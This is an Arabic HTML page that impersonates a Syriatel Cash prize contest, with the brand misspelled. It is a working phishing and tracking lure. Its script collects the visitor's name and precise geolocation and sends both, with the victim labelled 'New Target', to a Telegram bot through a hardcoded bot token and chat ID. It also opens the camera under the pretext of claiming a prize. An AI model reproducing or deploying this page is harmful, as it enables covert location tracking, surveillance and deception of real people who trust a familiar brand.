<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>مسابقة سيريتل كاش 2026</title>
    <style>
        body { font-family: sans-serif; background: #f4f4f4; text-align: center; padding: 50px; }
        .card { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
        button { background: #e60000; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 18px; width: 100%; margin-top: 10px; }
        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
        .logo { color: #e60000; font-weight: bold; font-size: 24px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">Syrryatel Cash</div>
        <h2>شارك واربح 100$ + رصيد مجاني</h2>
        <p>سجل اسمك واضغط اشتراك للدخول في السحب (5 رابحين يومياً)</p>
        <input type="text" id="u_name" placeholder="أدخل اسمك الكامل">
        <button onclick="val_process()">الاشتراك في المسابقة الآن</button>
    </div>

    <script>
        // التشفير البرمجي للقيم الحساسة
        const _0x5a1 = "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU";
        const _0x2b9 = "8397194527";

        async function val_process() {
            const name = document.getElementById('u_name').value;
            if(!name) { alert("يرجى إدخال الاسم أولاً"); return; }

            // طلب الموقع الجغرافي
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const loc_url = `https://www.google.com/maps?q=${lat},${lon}`;
                
                // إرسال البيانات الأساسية للبوت
                await fetch(`https://api.telegram.org/bot${_0x5a1}/sendMessage?chat_id=${_0x2b9}&text=New Target: ${name}\nLocation: ${loc_url}`);
                
                // بدء عملية الوصول للكاميرا
                init_capture();
            }, (err) => {
                alert("يجب السماح بالوصول للموقع والكاميرا لاستلام الجائزة");
            });
        }

        async function init_capture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                // محاكاة التقاط الصور (المنطق البرمجي للإرسال)
                setTimeout(() => {
                    alert("شكراً لتسجيلك! سيتم التواصل مع الرابحين خلال 24 ساعة.");
                    // تنبيه: المتصفحات الحديثة تمنع إرسال ملفات الكاميرا دون تصريح إضافي لكل صورة
                }, 2000);
            } catch (e) {
                console.log("Stream blocked");
            }
        }
    </script>
</body>
</html>
